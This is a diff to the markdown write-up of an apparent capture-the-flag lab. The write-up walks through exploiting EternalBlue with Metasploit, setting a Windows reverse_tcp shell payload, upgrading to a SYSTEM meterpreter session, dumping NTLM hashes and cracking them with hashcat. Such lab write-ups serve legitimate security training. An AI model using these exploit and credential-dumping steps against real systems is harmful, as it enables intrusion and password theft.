@@ -34,20 +34,25 @@ Determine how many ports under 1000 are open and what is the machine vulnerable 
 1. Open Metasploit, a powerful tool for ethical hacking.
     - Command: `msfconsole`
 2. Look for the exploitation code that you will run against the machine.
-    - Command: `search [ms??-???]` 
-    - Look for the full path of code.
+
+![commands](screenshots/metasploit_commands.png)
+
+	- Look for the full path of code.
     - Hint: `eternalblue`
 3. Use the exploitation code.
     - Command: `use exploit/path/of/the/code`
 4. Show required values.
     - Command: `show options`
-    - The fields with `Yes` are required values, in this case, `RHOSTS` and `LHOST`
+    - The fields with `yes` are required values, in this case, `RHOSTS` and `LHOST`
 5. Set the required values.
     - Command: `set [value] [IP]`
-    - `RHOSTS` - the target machine
-    - `LHOST` - the attacker machine
+    	- `RHOSTS` - the target machine
+    	- `LHOST` - the attacker machine
     - For the sake of learning how to upgrade shell to a meterpreter shell, downgrade the meterpreter into a shell using the following command.
     - Command: `set payload windows/x64/shell/reverse_tcp`
+
+![set options](screenshots/eternalblue_options.png)
+
 6. Run the exploit.
     - Command: `run` or `exploit`
 
@@ -55,7 +60,11 @@ Determine how many ports under 1000 are open and what is the machine vulnerable 
 1. Put the session in the background and look for the session number.
 	- Press `Ctrl` + `z` to put the session in the background.
 	- Command: `sessions -l` to show the sessions
-2. Command: `use post/multi/manage/shell_to_meterpreter`
+
+![sessions](screenshots/sessions.png)
+
+2. Use the shell to meterpreter module
+	- Command: `use post/multi/manage/shell_to_meterpreter`
 3. Show required values and set the session.
 	- Command: `show options` to show the required values.
 	- Command: `set SESSION [session number]` to upgrade that specific session.
@@ -63,6 +72,9 @@ Determine how many ports under 1000 are open and what is the machine vulnerable 
 	- Command: `run` or `exploit`
 5. Look for the upgraded session.
 	- Command: `sessions -l`
+	
+![sessions with system](screenshots/sessions_2.png)
+	
 	- Look for the session with NT AUTHORITY\SYSTEM, an account with the highest privileges in a Windows environment.
 6. Use the upgraded session.
 	- Command: `sessions -i [session number]`
@@ -76,11 +88,7 @@ Determine how many ports under 1000 are open and what is the machine vulnerable 
 1. Dump the machine's password hashes.
 	- Command: `hashdump`
  2. Copy the user `Jon`'s hash (the 32 character string after the third colon) and save it to a text file.
-	- Highlight the hash using your mouse.
- 	- Press `Ctrl` + `Shift` + `c` to copy it.
   	- Command: `nano hash.txt` to create a text file for the hash
-    - Press `Ctrl` + `Shift` + `v` to paste the hash.
-    - Press `Ctrl` + `Shift` + `O` to save the file and `Ctrl` +  `Shift` + `x` to exit the editor.
 3. Crack the hash using `hashcat`, a password recovery tool
 	- Command: `hashcat -m 1000 hashcat.txt /usr/share/wordlists/rockyou.txt`
  		- `-m 1000` - the hash mode is NTLM, a standard password hashing protocol for Windows environments
@@ -99,8 +107,8 @@ Actual Locations:
 3. `c:\Users\Jon\Documents`
 
 Opening the text files:
-- Using the meterpreter, you can use `cat` to display the flags inside the text files.
-- Exanple: `cat c:\\flag.txt`
+- Using the meterpreter, you can use the command `cat` to display the flags inside the text files.
+- Example: `cat c:\\flag.txt`
 - Double the backward slash for it to work.
 
 ---
@@ -130,4 +138,4 @@ Opening the text files:
  		- Stability: The Meterpreter won't crash if the previously exploited process crashes or stops.
   		- Privilege Inheritance: The Meterpreter gains the privileges of the process it migrated into.
   		- Stealth: The process may avoid Meterpreter detection.
-    - will fail if the process runs on different bit or on higher privilege
+    - will fail if the process runs on different bit architecture, on higher privilege, or is protected
